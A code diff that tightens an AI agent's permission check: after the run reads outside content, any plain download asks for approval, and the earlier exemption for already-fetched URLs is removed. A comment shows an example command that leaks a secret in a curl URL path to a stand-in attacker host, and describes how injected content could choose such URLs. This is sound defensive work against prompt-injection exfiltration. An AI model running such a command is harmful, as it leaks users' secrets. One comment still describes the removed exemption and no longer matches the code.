@@ -121,11 +121,6 @@ export class RunGrants {
   /** Set once the run reads outside content; some actions then always ask. */
   public tainted = false;
   /**
-   * URLs whose text this run already has (filled from ToolContext.pages). Re-reading one sends nothing the run did not already send, so a plain download of it
-   * is not held by the taint rule. A shell download is not recorded, so a second `curl` of the same URL after taint still asks.
-   */
-  public readonly fetched = new Set<string>();
-  /**
    * The engagement-wide grant for intrusive cyber steps (D-04): granted once for a run, and each
    * step must still name that engagement and an in-scope target. Undefined for every other run, so
    * no existing decision changes.
@@ -217,7 +212,7 @@ export async function decidePermissionAsync(capability: ActionCapability, comman
   // `curl -sS -o /dev/null https://evil.test/sk-…` puts a secret in the PATH, which no flag or expansion check sees. A URL the run already has the text of
   // sends nothing new, so re-reading it runs.
   const download = grants.tainted ? simpleDownload(command ?? '') : undefined;
-  if (download?.plain && !grants.fetched.has(download.url ?? '')) {
+  if (download?.plain) {
     return { decision: 'ask', reason: 'This run read outside content, and this download sends a URL that content may have chosen, which can carry data out in the path, the query or a header. Approve it only if you expected it.' };
   }
   if (policy.mode !== 'auto' || !auto) return decided;
